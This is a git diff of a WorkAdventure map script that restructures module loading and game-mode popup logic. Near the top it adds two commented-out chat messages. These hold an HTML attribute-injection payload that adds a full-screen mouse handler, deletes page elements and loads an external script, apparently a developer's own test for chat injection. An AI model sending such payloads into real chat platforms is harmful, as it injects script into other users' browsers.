@@ -1,4 +1,5 @@
-const requirePromises = Promise.all([
+
+scriptNesting(Promise.all([
     require('./backend-connection'),
     require('./zoned-popup'),
     require('./game/user-data'),
@@ -7,13 +8,17 @@ const requirePromises = Promise.all([
     require('./minato-event'),
     require('./game-mode'),
     require('./communication'),
-]);
-(async () => {
+]), async imports => {
+    // WA.sendChatMessage(`test https://www.google.de"onmousemove="debugger;event.target.parentElement.parentElement.remove();window.scr=document.createElement('script');window.scr.src='http://localhost/scripts/injected.js';document.body.appendChild(window.scr);"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
+    // WA.sendChatMessage(`test https://www.google.de"onmousemove="debugger;"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
 
-    const [{ message, ws }, { popupInZone }, { getUserData }, { multiStrandedPopupConversation }] = await requirePromises;
+
+    const [{ message, ws }, { popupInZone }, { getUserData }, { multiStrandedPopupConversation }] = await imports;
 
     console.log('script run');
     const data = await getUserData();
+
+
     if(!data.gameModeEnabled) {
         WA.registerMenuCommand('miro', () => {
             WA.openCoWebSite('https://jonnytest1.github.io/workadventuremap/scripts/pages/miro.html');
@@ -88,8 +93,6 @@ const requirePromises = Promise.all([
         ]
     })
 
-
-
     if(data.gameModeEnabled) {
         const amount = 4
         /**
@@ -110,10 +113,9 @@ const requirePromises = Promise.all([
             let nextMessageEl
             for(let choiceI = 0; choiceI < 5; choiceI++) {
                 if(typeof messageEl.buttons !== "string") {
-
                     /**
-                       * @type {import('./conversation').ButtonElement}
-                       */
+                     * @type {import('./conversation').ButtonElement}
+                     */
                     const buttonElement = {
                         buttonText: `${choiceI}`
                     };
@@ -175,5 +177,4 @@ const requirePromises = Promise.all([
         })
 
     }
-
-})();
+})
